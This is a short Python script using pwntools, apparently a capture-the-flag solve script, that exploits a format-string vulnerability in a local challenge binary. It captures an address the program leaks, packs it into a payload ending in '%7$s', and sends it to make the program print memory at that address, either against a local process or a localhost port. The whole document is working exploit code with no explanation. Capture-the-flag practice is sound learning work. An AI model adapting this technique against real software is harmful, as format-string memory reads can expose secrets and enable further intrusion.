from pwn import *
import sys

chall = './challenge/chall'

elf = ELF(chall)

if len(sys.argv) > 1:
    host, port = 'localhost', sys.argv[1]
    p = remote(host, port)
else:
    p = process(elf.path)

s = p.recvuntil(b'Name : ').decode()
addr = s.split('\n')[0].split(':')[1].strip()
print(f'Leak: {addr}')

payload = b'ab'+p32(int(addr, 16))+b'%7$s'

print(payload)

p.sendline(payload)
print(p.recvline())
